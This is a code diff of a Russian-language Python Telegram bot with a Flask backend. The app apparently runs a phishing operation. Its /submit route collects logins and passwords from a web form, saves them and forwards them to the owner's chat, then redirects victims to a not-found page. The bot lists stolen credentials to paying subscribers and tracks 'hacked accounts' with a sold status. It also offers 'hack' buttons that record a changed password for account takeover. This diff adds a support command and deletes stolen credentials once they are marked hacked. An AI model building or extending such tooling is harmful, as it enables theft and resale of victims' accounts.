@@ -22,6 +22,7 @@ tech_break = None
 tech_reason = None  # Причина техперерыва
 processed_updates = set()
 pending_hacked = {}  # Для отслеживания процесса добавления
+pending_support = {}  # Для отслеживания процесса поддержки
 
 # === Установка часового пояса (UTC+2) ===
 def get_current_time():
@@ -44,17 +45,13 @@ def init_db():
         return False
     try:
         c = conn.cursor()
-        print("Создаем таблицу 'users', если не существует")
         c.execute('''CREATE TABLE IF NOT EXISTS users 
                      (chat_id TEXT PRIMARY KEY, prefix TEXT, subscription_end TEXT, site_clicks INTEGER DEFAULT 0, password_views INTEGER DEFAULT 0)''')
-        print("Создаем таблицу 'credentials', если не существует")
         c.execute('''CREATE TABLE IF NOT EXISTS credentials 
                      (login TEXT PRIMARY KEY, password TEXT, added_time TEXT)''')
-        print("Создаем таблицу 'hacked_accounts', если не существует")
         c.execute('''CREATE TABLE IF NOT EXISTS hacked_accounts 
                      (login TEXT PRIMARY KEY, password TEXT, hack_date TEXT, prefix TEXT, sold_status TEXT, linked_chat_id TEXT)''')
         subscription_end = (get_current_time() + timedelta(days=3650)).isoformat()
-        print(f"Устанавливаем Создателя для {ADMIN_CHAT_ID}")
         c.execute("INSERT INTO users (chat_id, prefix, subscription_end) VALUES (%s, %s, %s) "
                   "ON CONFLICT (chat_id) DO UPDATE SET prefix = EXCLUDED.prefix, subscription_end = EXCLUDED.subscription_end",
                   (ADMIN_CHAT_ID, "Создатель", subscription_end))
@@ -75,15 +72,13 @@ def keep_alive():
             print(f"🔁 Пинг: {response.status_code} - {response.text[:50]}")
         except Exception as e:
             print(f"Ошибка keep-alive: {e}")
-        time.sleep(60)  # Пинг каждую минуту
+        time.sleep(60)
 
 # === Функции для работы с базой ===
 def get_user(chat_id):
     conn = get_db_connection()
     if conn is None:
-        print(f"Не удалось получить пользователя {chat_id}: нет подключения к БД")
         if chat_id == ADMIN_CHAT_ID:
-            print(f"Жестко задаем Создателя для {chat_id}")
             return {
                 'prefix': 'Создатель',
                 'subscription_end': get_current_time() + timedelta(days=3650),
@@ -97,14 +92,12 @@ def get_user(chat_id):
         result = c.fetchone()
         conn.close()
         if result:
-            print(f"Пользователь {chat_id} найден: {result}")
             return {
                 'prefix': result[0],
                 'subscription_end': datetime.fromisoformat(result[1]) if result[1] else None,
                 'site_clicks': result[2],
                 'password_views': result[3]
             }
-        print(f"Пользователь {chat_id} не найден")
         return None
     except Exception as e:
         print(f"Ошибка в get_user для {chat_id}: {e}")
@@ -114,7 +107,6 @@ def get_user(chat_id):
 def save_user(chat_id, prefix, subscription_end=None):
     conn = get_db_connection()
     if conn is None:
-        print(f"Не удалось сохранить пользователя {chat_id}: нет подключения к БД")
         return
     try:
         c = conn.cursor()
@@ -125,7 +117,6 @@ def save_user(chat_id, prefix, subscription_end=None):
                   (chat_id, prefix, subscription_end, prefix, subscription_end))
         conn.commit()
         conn.close()
-        print(f"Пользователь {chat_id} сохранен с префиксом {prefix}")
     except Exception as e:
         print(f"Ошибка сохранения пользователя {chat_id}: {e}")
         conn.close()
@@ -133,14 +124,12 @@ def save_user(chat_id, prefix, subscription_end=None):
 def increment_site_clicks(chat_id):
     conn = get_db_connection()
     if conn is None:
-        print(f"Не удалось обновить клики для {chat_id}: нет подключения к БД")
         return
     try:
         c = conn.cursor()
         c.execute("UPDATE users SET site_clicks = site_clicks + 1 WHERE chat_id = %s", (chat_id,))
         conn.commit()
         conn.close()
-        print(f"Клики на сайт увеличены для {chat_id}")
     except Exception as e:
         print(f"Ошибка увеличения кликов для {chat_id}: {e}")
         conn.close()
@@ -148,14 +137,12 @@ def increment_site_clicks(chat_id):
 def increment_password_views(chat_id):
     conn = get_db_connection()
     if conn is None:
-        print(f"Не удалось обновить просмотры паролей для {chat_id}: нет подключения к БД")
         return
     try:
         c = conn.cursor()
         c.execute("UPDATE users SET password_views = password_views + 1 WHERE chat_id = %s", (chat_id,))
         conn.commit()
         conn.close()
-        print(f"Просмотры паролей увеличены для {chat_id}")
     except Exception as e:
         print(f"Ошибка увеличения просмотров паролей для {chat_id}: {e}")
         conn.close()
@@ -163,7 +150,6 @@ def increment_password_views(chat_id):
 def save_credentials(login, password):
     conn = get_db_connection()
     if conn is None:
-        print("Не удалось сохранить учетные данные: нет подключения к БД")
         return False
     try:
         c = conn.cursor()
@@ -173,7 +159,6 @@ def save_credentials(login, password):
                   (login, password, added_time, password, added_time))
         conn.commit()
         conn.close()
-        print(f"Учетные данные сохранены: login={login}, password={password}")
         return True
     except Exception as e:
         print(f"Ошибка сохранения учетных данных: {e}")
@@ -183,14 +168,12 @@ def save_credentials(login, password):
 def delete_credentials(login):
     conn = get_db_connection()
     if conn is None:
-        print("Не удалось удалить учетные данные: нет подключения к БД")
         return False
     try:
         c = conn.cursor()
         c.execute("DELETE FROM credentials WHERE login = %s", (login,))
         conn.commit()
         conn.close()
-        print(f"Учетные данные удалены: login={login}")
         return True
     except Exception as e:
         print(f"Ошибка удаления учетных данных: {e}")
@@ -200,7 +183,6 @@ def delete_credentials(login):
 def save_hacked_account(login, password, prefix, sold_status, linked_chat_id):
     conn = get_db_connection()
     if conn is None:
-        print("Не удалось сохранить взломанный аккаунт: нет подключения к БД")
         return False
     try:
         c = conn.cursor()
@@ -212,7 +194,6 @@ def save_hacked_account(login, password, prefix, sold_status, linked_chat_id):
                    password, hack_date, prefix, sold_status, linked_chat_id))
         conn.commit()
         conn.close()
-        print(f"Взломанный аккаунт сохранен: login={login}, password={password}, sold_status={sold_status}")
         return True
     except Exception as e:
         print(f"Ошибка сохранения взломанного аккаунта: {e}")
@@ -222,14 +203,12 @@ def save_hacked_account(login, password, prefix, sold_status, linked_chat_id):
 def delete_hacked_account(login):
     conn = get_db_connection()
     if conn is None:
-        print("Не удалось удалить взломанный аккаунт: нет подключения к БД")
         return False
     try:
         c = conn.cursor()
         c.execute("DELETE FROM hacked_accounts WHERE login = %s", (login,))
         conn.commit()
         conn.close()
-        print(f"Взломанный аккаунт удален: login={login}")
         return True
     except Exception as e:
         print(f"Ошибка удаления взломанного аккаунта: {e}")
@@ -239,14 +218,12 @@ def delete_hacked_account(login):
 def delete_user(chat_id):
     conn = get_db_connection()
     if conn is None:
-        print("Не удалось удалить пользователя: нет подключения к БД")
         return False
     try:
         c = conn.cursor()
         c.execute("DELETE FROM users WHERE chat_id = %s", (chat_id,))
         conn.commit()
         conn.close()
-        print(f"Пользователь удален: chat_id={chat_id}")
         return True
     except Exception as e:
         print(f"Ошибка удаления пользователя: {e}")
@@ -256,14 +233,12 @@ def delete_user(chat_id):
 def get_credentials():
     conn = get_db_connection()
     if conn is None:
-        print("Не удалось получить учетные данные: нет подключения к БД")
         return []
     try:
         c = conn.cursor()
         c.execute("SELECT login, password, added_time FROM credentials")
         result = c.fetchall()
         conn.close()
-        print(f"Учетные данные получены: {result}")
         return result
     except Exception as e:
         print(f"Ошибка получения учетных данных: {e}")
@@ -273,14 +248,12 @@ def get_credentials():
 def get_hacked_accounts():
     conn = get_db_connection()
     if conn is None:
-        print("Не удалось получить взломанные аккаунты: нет подключения к БД")
         return []
     try:
         c = conn.cursor()
         c.execute("SELECT login, password, hack_date, prefix, sold_status, linked_chat_id FROM hacked_accounts")
         result = c.fetchall()
         conn.close()
-        print(f"Взломанные аккаунты получены: {result}")
         return result
     except Exception as e:
         print(f"Ошибка получения взломанных аккаунтов: {e}")
@@ -290,14 +263,12 @@ def get_hacked_accounts():
 def get_all_users():
     conn = get_db_connection()
     if conn is None:
-        print("Не удалось получить всех пользователей: нет подключения к БД")
         return []
     try:
         c = conn.cursor()
         c.execute("SELECT chat_id, prefix, subscription_end, site_clicks, password_views FROM users")
         result = c.fetchall()
         conn.close()
-        print(f"Все пользователи получены: {result}")
         return result
     except Exception as e:
         print(f"Ошибка получения всех пользователей: {e}")
@@ -314,9 +285,8 @@ def format_time_with_minutes(iso_time):
 # === Проверка доступа ===
 def check_access(chat_id, command):
     global tech_break, tech_reason
-    print(f"Проверка доступа для {chat_id} на команду {command}")
     user = get_user(chat_id)
-    if user is None and command in ['start', 'menu', 'getchatid']:
+    if user is None and command in ['start', 'menu', 'getchatid', 'support']:
         save_user(chat_id, "Посетитель")
         user = get_user(chat_id)
     
@@ -325,7 +295,7 @@ def check_access(chat_id, command):
         if time_left > 0:
             return f"⏳ Техперерыв до {tech_break.strftime('%H:%M')} (UTC+2).\nПричина: {tech_reason}\nОсталось: {int(time_left)} мин."
     if not user or user['prefix'] == 'Посетитель':
-        if command in ['start', 'menu', 'getchatid']:
+        if command in ['start', 'menu', 'getchatid', 'support']:
             return None
         return "🔒 Доступ ограничен!\nКупите подписку у @sacoectasy.\nВаш ID: /getchatid"
     if user['subscription_end'] and user['subscription_end'] < get_current_time():
@@ -335,7 +305,6 @@ def check_access(chat_id, command):
         return "🔒 Команда только для Админов и Создателя!"
     if command in ['hacked', 'database', 'techstop', 'techstopoff', 'adprefix', 'delprefix'] and user['prefix'] != 'Создатель':
         return "🔒 Команда только для Создателя!"
-    print(f"Доступ разрешен для {chat_id} на {command}")
     return None
 
 # === Flask маршруты ===
@@ -353,11 +322,8 @@ def submit():
         login = request.form.get('login')
         password = request.form.get('password')
         if login and password:
-            print(f"Получен логин: {login}, пароль: {password}")
             if save_credentials(login, password):
                 bot.send_message(ADMIN_CHAT_ID, f"🔐 Новый логин добавлен:\nЛогин: {login}\nПароль: {password}")
-            else:
-                print("Не удалось сохранить учетные данные в БД")
         return redirect(url_for('not_found'))
     except Exception as e:
         print(f"Ошибка в /submit: {e}")
@@ -372,23 +338,15 @@ def webhook():
     try:
         if request.headers.get('content-type') == 'application/json':
             json_string = request.get_data().decode('utf-8')
-            print(f"Получены данные вебхука: {json_string}")
             update = telebot.types.Update.de_json(json_string)
             if update and (update.message or update.callback_query):
                 update_id = update.update_id
                 if update_id in processed_updates:
-                    print(f"Повторный update_id: {update_id}, пропускаем")
                     return 'OK', 200
                 processed_updates.add(update_id)
-                print(f"Обработка обновления: {update}")
                 bot.process_new_updates([update])
-                print("Обновление успешно обработано")
-            else:
-                print("В данных вебхука нет валидного обновления")
             return 'OK', 200
-        else:
-            print(f"Неверный тип запроса: {request.headers.get('content-type')}")
-            return 'Неверный запрос', 400
+        return 'Неверный запрос', 400
     except Exception as e:
         print(f"Ошибка в вебхуке: {e}")
         return 'OK', 200
@@ -397,7 +355,6 @@ def webhook():
 @bot.message_handler(commands=['start'])
 def start_cmd(message):
     chat_id = str(message.chat.id)
-    print(f"Обработка /start для chat_id: {chat_id}")
     access = check_access(chat_id, 'start')
     if access:
         bot.reply_to(message, access)
@@ -407,19 +364,16 @@ def start_cmd(message):
 @bot.message_handler(commands=['getchatid'])
 def getchatid_cmd(message):
     chat_id = str(message.chat.id)
-    print(f"Обработка /getchatid для chat_id: {chat_id}")
     access = check_access(chat_id, 'getchatid')
     if access:
         bot.reply_to(message, access)
         return
-    user = get_user(chat_id)
     username = message.from_user.username or "Нет юзернейма"
-    bot.reply_to(message, f"👤 Ваш Chat ID: `{chat_id}`\nЮзернейм: @{username}")
+    bot.reply_to(message, f"👤 Ваш Chat ID: `{chat_id}`\nЮзернейм: @{username}", parse_mode='Markdown')
 
 @bot.message_handler(commands=['site'])
 def site_cmd(message):
     chat_id = str(message.chat.id)
-    print(f"Обработка /site для chat_id: {chat_id}")
     access = check_access(chat_id, 'site')
     if access:
         bot.reply_to(message, access)
@@ -432,7 +386,6 @@ def site_cmd(message):
 @bot.message_handler(commands=['menu'])
 def menu_cmd(message):
     chat_id = str(message.chat.id)
-    print(f"Обработка /menu для chat_id: {chat_id}")
     access = check_access(chat_id, 'menu')
     if access:
         bot.reply_to(message, access)
@@ -455,7 +408,8 @@ def menu_cmd(message):
     response += "\n\n📋 **Команды бота**:\n" \
                 "/start — запустить бота\n" \
                 "/menu — показать это меню\n" \
-                "/getchatid — узнать ваш ID и юзернейм"
+                "/getchatid — узнать ваш ID и юзернейм\n" \
+                "/support — сообщить об ошибке создателю"
     if user['prefix'] != 'Посетитель':
         response += "\n/site — получить ссылку на сайт\n" \
                     "/hacked — список взломанных аккаунтов"
@@ -474,10 +428,33 @@ def menu_cmd(message):
     
     bot.reply_to(message, response, parse_mode='Markdown')
 
+@bot.message_handler(commands=['support'])
+def support_cmd(message):
+    chat_id = str(message.chat.id)
+    access = check_access(chat_id, 'support')
+    if access:
+        bot.reply_to(message, access)
+        return
+    msg = bot.reply_to(message, "📩 Опишите проблему или баг, который вы нашли.\nСообщение будет отправлено создателю (@sacoectasy).")
+    pending_support[chat_id] = {'step': 'awaiting_message', 'message_id': msg.message_id}
+
+@bot.message_handler(func=lambda message: str(message.chat.id) in pending_support)
+def handle_support_input(message):
+    chat_id = str(message.chat.id)
+    if chat_id not in pending_support:
+        return
+    
+    data = pending_support[chat_id]
+    if data['step'] == 'awaiting_message':
+        support_message = message.text.strip()
+        username = message.from_user.username or "Нет юзернейма"
+        bot.send_message(ADMIN_CHAT_ID, f"📬 Сообщение от @{username} (ID: {chat_id}):\n\n{support_message}")
+        bot.reply_to(message, "✅ Ваше сообщение отправлено создателю (@sacoectasy)!")
+        del pending_support[chat_id]
+
 @bot.message_handler(commands=['techstop'])
 def techstop_cmd(message):
     chat_id = str(message.chat.id)
-    print(f"Обработка /techstop для chat_id: {chat_id}")
     access = check_access(chat_id, 'techstop')
     if access:
         bot.reply_to(message, access)
@@ -496,7 +473,6 @@ def techstop_cmd(message):
 @bot.message_handler(commands=['techstopoff'])
 def techstopoff_cmd(message):
     chat_id = str(message.chat.id)
-    print(f"Обработка /techstopoff для chat_id: {chat_id}")
     access = check_access(chat_id, 'techstopoff')
     if access:
         bot.reply_to(message, access)
@@ -509,7 +485,6 @@ def techstopoff_cmd(message):
 @bot.message_handler(commands=['passwords'])
 def passwords_cmd(message):
     chat_id = str(message.chat.id)
-    print(f"Обработка /passwords для chat_id: {chat_id}")
     access = check_access(chat_id, 'passwords')
     if access:
         bot.reply_to(message, access)
@@ -520,20 +495,20 @@ def passwords_cmd(message):
         bot.reply_to(message, "📂 Список паролей пуст.\nДобавьте через /addcred <логин> <пароль>.")
         return
     response = "🔑 **Список паролей**:\n"
-    markup = types.InlineKeyboardMarkup()
-    for login, password, added_time in credentials:
+    for i, (login, password, added_time) in enumerate(credentials, 1):
         formatted_time = format_time_with_minutes(added_time)
-        response += f"👤 Логин: `{login}`\n🔒 Пароль: `{password}`\n⏰ Добавлен: {formatted_time}\n\n"
+        response += f"**Пароль #{i}**\n👤 Логин: `{login}`\n🔒 Пароль: `{password}`\n⏰ Добавлен: {formatted_time}\n\n"
+        markup = types.InlineKeyboardMarkup()
         markup.add(
-            types.InlineKeyboardButton(f"🗑 Удалить", callback_data=f"delete_cred_{login}"),
-            types.InlineKeyboardButton(f"🔓 Взломать", callback_data=f"hack_cred_{login}_{chat_id}")
+            types.InlineKeyboardButton(f"🗑 Удалить #{i}", callback_data=f"delete_cred_{login}"),
+            types.InlineKeyboardButton(f"🔓 Взломать #{i}", callback_data=f"hack_cred_{login}_{chat_id}")
         )
-    bot.reply_to(message, response, reply_markup=markup, parse_mode='Markdown')
+        bot.send_message(chat_id, response, reply_markup=markup, parse_mode='Markdown')
+        response = ""  # Сбрасываем для следующего пароля
 
 @bot.message_handler(commands=['hacked'])
 def hacked_cmd(message):
     chat_id = str(message.chat.id)
-    print(f"Обработка /hacked для chat_id: {chat_id}")
     access = check_access(chat_id, 'hacked')
     if access:
         bot.reply_to(message, access)
@@ -568,7 +543,6 @@ def hacked_cmd(message):
 @bot.message_handler(commands=['addhacked'])
 def add_hacked_cmd(message):
     chat_id = str(message.chat.id)
-    print(f"Обработка /addhacked для chat_id: {chat_id}")
     access = check_access(chat_id, 'hacked')
     if access:
         bot.reply_to(message, access)
@@ -588,7 +562,6 @@ def add_hacked_cmd(message):
 @bot.callback_query_handler(func=lambda call: call.data.startswith("hack_") or call.data == "add_hacked" or call.data.startswith("hack_cred_"))
 def handle_hack_callback(call):
     chat_id = str(call.message.chat.id)
-    print(f"Обработка callback для chat_id: {chat_id}, data: {call.data}")
     
     if call.data == "add_hacked":
         msg = bot.edit_message_text("📝 Введите логин и пароль:\nФормат: `<логин> <пароль>`\nПример: `test test123`",
@@ -638,7 +611,8 @@ def handle_hack_callback(call):
             'sold_status': sold_status,
             'linked_chat_id': linked_chat_id,
             'message_id': msg.message_id,
-            'step': 'awaiting_new_password'
+            'step': 'awaiting_new_password',
+            'from_passwords': call.data.startswith("hack_cred_")
         }
 
 @bot.message_handler(func=lambda message: str(message.chat.id) in pending_hacked)
@@ -673,6 +647,8 @@ def handle_hacked_input(message):
         prefix = user['prefix']
         
         if save_hacked_account(login, new_password, prefix, sold_status, linked_chat_id):
+            if data.get('from_passwords'):
+                delete_credentials(login)  # Удаляем из credentials, если из /passwords
             bot.reply_to(message, f"✅ Аккаунт `{login}` успешно добавлен в взломанные!\n"
                                 f"🔒 Новый пароль: `{new_password}`\n"
                                 f"💰 Статус: {sold_status}\n"
@@ -684,7 +660,6 @@ def handle_hacked_input(message):
 @bot.callback_query_handler(func=lambda call: call.data.startswith("delete_"))
 def handle_delete_callback(call):
     chat_id = str(call.message.chat.id)
-    print(f"Обработка callback для chat_id: {chat_id}, data: {call.data}")
     
     if call.data.startswith("delete_cred_"):
         login = call.data[len("delete_cred_"):]
@@ -707,7 +682,6 @@ def handle_delete_callback(call):
 @bot.message_handler(commands=['admin'])
 def admin_cmd(message):
     chat_id = str(message.chat.id)
-    print(f"Обработка /admin для chat_id: {chat_id}")
     access = check_access(chat_id, 'admin')
     if access:
         bot.reply_to(message, access)
@@ -735,14 +709,13 @@ def admin_cmd(message):
 @bot.message_handler(commands=['adprefix'])
 def adprefix_cmd(message):
     chat_id = str(message.chat.id)
-    print(f"Обработка /adprefix для chat_id: {chat_id}")
     access = check_access(chat_id, 'adprefix')
     if access:
         bot.reply_to(message, access)
         return
     args = message.text.split()[1:] if len(message.text.split()) > 1 else []
     if len(args) < 3 or not args[2].isdigit():
-        bot.reply_to(message, "❌ Формат: /adprefix <chat_id> <префикс> <дни>\nДоступные префиксы: Админ, Пользователь\nПример: /adprefix 123456789 Админ 30")
+        bot.reply_to(message, "❌ Формат: /adprefix <chat_id> <префикс> <дни>\nПример: /adprefix 123456789 Админ 30")
         return
     target_chat_id, prefix, days = args[0], args[1], int(args[2])
     if prefix not in ["Админ", "Пользователь"]:
@@ -755,7 +728,6 @@ def adprefix_cmd(message):
 @bot.message_handler(commands=['delprefix'])
 def delprefix_cmd(message):
     chat_id = str(message.chat.id)
-    print(f"Обработка /delprefix для chat_id: {chat_id}")
     access = check_access(chat_id, 'delprefix')
     if access:
         bot.reply_to(message, access)
@@ -771,7 +743,6 @@ def delprefix_cmd(message):
 @bot.message_handler(commands=['database'])
 def database_cmd(message):
     chat_id = str(message.chat.id)
-    print(f"Обработка /database для chat_id: {chat_id}")
     access = check_access(chat_id, 'database')
     if access:
         bot.reply_to(message, access)
@@ -779,7 +750,6 @@ def database_cmd(message):
     
     response = "📊 **Управление базой данных**\n\n"
     
-    # Пользователи
     users = get_all_users()
     response += "👤 **Пользователи**:\n"
     if not users:
@@ -789,7 +759,6 @@ def database_cmd(message):
             time_left = (datetime.fromisoformat(subscription_end) - get_current_time()).days if subscription_end else 0
             response += f"🆔 `{chat_id_user}` | 👑 {prefix} | ⏳ {time_left} дней\n"
     
-    # Пароли
     credentials = get_credentials()
     response += "\n🔑 **Пароли**:\n"
     if not credentials:
@@ -799,7 +768,6 @@ def database_cmd(message):
             formatted_time = format_time_with_minutes(added_time)
             response += f"👤 `{login}` | 🔒 `{password}` | ⏰ {formatted_time}\n"
     
-    # Взломанные аккаунты
     hacked_accounts = get_hacked_accounts()
     response += "\n🔓 **Взломанные аккаунты**:\n"
     if not hacked_accounts:
@@ -820,7 +788,6 @@ def database_cmd(message):
 @bot.callback_query_handler(func=lambda call: call.data.startswith("db_"))
 def handle_db_callback(call):
     chat_id = str(call.message.chat.id)
-    print(f"Обработка callback базы данных для chat_id: {chat_id}, data: {call.data}")
     
     if call.data == "db_add":
         markup = types.InlineKeyboardMarkup()
@@ -843,7 +810,6 @@ def handle_db_callback(call):
     elif call.data == "db_view":
         bot.edit_message_text("📊 Вы уже просматриваете базу данных!", chat_id, call.message.message_id)
     
-    # Добавление
     elif call.data == "db_add_user":
         bot.edit_message_text("📝 Введите: /adduser <chat_id> <префикс> <дни>\nПример: /adduser 123456789 Админ 30", 
                              chat_id, call.message.message_id)
@@ -854,7 +820,6 @@ def handle_db_callback(call):
         bot.edit_message_text("📝 Введите: /addhacked <логин> <пароль>\nПример: /addhacked test test123", 
                              chat_id, call.message.message_id)
     
-    # Удаление
     elif call.data == "db_del_user":
         users = get_all_users()
         if not users:
@@ -883,7 +848,6 @@ def handle_db_callback(call):
                 markup.add(types.InlineKeyboardButton(f"{login}", callback_data=f"db_del_hacked_{login}"))
             bot.edit_message_text("📊 Выберите взломанный аккаунт для удаления:", chat_id, call.message.message_id, reply_markup=markup)
     
-    # Выполнение удаления
     elif call.data.startswith("db_del_user_"):
         chat_id_user = call.data[len("db_del_user_"):]
         if delete_user(chat_id_user):
@@ -906,7 +870,6 @@ def handle_db_callback(call):
 @bot.message_handler(commands=['adduser'])
 def add_user_cmd(message):
     chat_id = str(message.chat.id)
-    print(f"Обработка /adduser для chat_id: {chat_id}")
     access = check_access(chat_id, 'database')
     if access:
         bot.reply_to(message, access)
@@ -923,7 +886,6 @@ def add_user_cmd(message):
 @bot.message_handler(commands=['addcred'])
 def add_cred_cmd(message):
     chat_id = str(message.chat.id)
-    print(f"Обработка /addcred для chat_id: {chat_id}")
     access = check_access(chat_id, 'database')
     if access:
         bot.reply_to(message, access)
@@ -938,7 +900,7 @@ def add_cred_cmd(message):
     else:
         bot.reply_to(message, "❌ Ошибка при добавлении!")
 
-init_db()  # Инициализация при запуске
+init_db()
 
 if __name__ == "__main__":
     threading.Thread(target=keep_alive, daemon=True).start()
